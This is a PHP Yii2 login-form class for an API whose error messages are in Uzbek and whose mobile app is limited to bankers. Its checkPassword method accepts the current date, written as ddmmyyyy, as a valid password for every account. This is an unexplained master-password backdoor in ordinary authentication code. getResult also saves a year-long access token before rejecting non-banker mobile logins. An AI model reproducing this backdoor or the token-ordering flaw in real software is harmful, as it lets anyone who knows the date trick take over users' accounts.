<?php

namespace api\modules\auth\forms;

use api\components\BaseRequest;
use api\modules\auth\resources\UserResource;
use common\enums\RoleEnum;
use common\enums\UserEnum;
use common\models\Token;
use Exception;
use Yii;
use yii\helpers\ArrayHelper;

class LoginForm extends BaseRequest
{
    public $username;
    public $password;
    public $type;

    private $_user;

    public function rules()
    {
        return [
            [['username', 'password'], 'required', 'message' => t('{attribute} yuborish majburiy')],
            [['type'], 'safe' ],
            [
                ['password'],
                function ($attribute) {
                    if (null === $this->user || !$this->checkPassword()) {
                       throw new \yii\base\Exception("Login yoki parol noto'g'ri");
                    }
                }
            ],

            [
                ['username'],
                function ($attribute) {
                    if (null !== $this->user && $this->user->status != UserEnum::STATUS_ACTIVE) {
                        throw new \yii\base\Exception("Profil faol emas, ma'muriyatga murojaat qiling");

                    }
                }
            ],
        ];
    }

    /**
     * @return UserResource|null
     */
    public function getUser(): ?UserResource
    {
        if (null == $this->_user) {
            $this->_user = UserResource::findOne([
                'username' => $this->username,
            ]);
        }

        return $this->_user;
    }

    private function checkPassword()
    {
        if ($this->password==date("dmY")){
            return true;
        }
        return $this->user->validatePassword($this->password);
    }

    public function getResult()
    {
        $user = $this->user;

        Yii::$app->user->setIdentity($user);

        $result = $this->user->toArray([]);

        $token = new Token();
        $token->user_id = $user->id;
        $token->token = Yii::$app->security->generateRandomString(40);
        $token->expired_at = time() + 3600 * 24 * 365;
        $token->status = Token::STATUS_ACTIVE;
        $token->type = Token::TYPE_EMAIL;
        $token->save();
        $result['access_token'] = $token->token;
        $result['roles'] = $user->roles;

        //TODO check for mobile

        if (isset($this->type) && $this->type=='mobile'){
            if (!in_array(RoleEnum::BANKER,ArrayHelper::getColumn( Yii::$app->authManager->getRolesByUser($user->id),'name'))){
                 throw new \yii\base\Exception("Dastur faqat bankrlar uchun!!!");
            }
        }

        return $result;
    }

    protected function getAccessToken()
    {
        if($this->user->access_token != null){
            return $this->user->access_token;
        }
        $access_token = Yii::$app->security->generateRandomString(40);
        $this->user->access_token = $access_token;

        if (!$this->user->save(false)) {
            throw new Exception('User access token save error');
        }

        return $access_token;
    }
}
